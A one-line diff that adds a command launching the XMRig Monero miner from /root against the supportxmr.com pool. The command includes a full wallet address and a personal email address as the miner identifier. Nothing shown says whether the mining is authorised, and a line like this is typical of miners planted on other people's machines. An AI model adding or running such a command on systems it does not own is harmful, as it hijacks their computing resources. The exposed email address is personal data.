@@ -1,0 +1,1 @@
+/root/xmrig/build/./xmrig -a cryptonight -o stratum+tcp://pool.supportxmr.com:5555 -u 4ABWJhLP8Tqe4uR4wcygBb7wTLJoudmLUhUezH176E3cbnmVhjUUHQwTdKrmzec3DPZ7e8GHidCDLYnAuuBQmDqvSEsj4vJ -p MinerIdentifier:guten.muzik@gmail.com -t 1
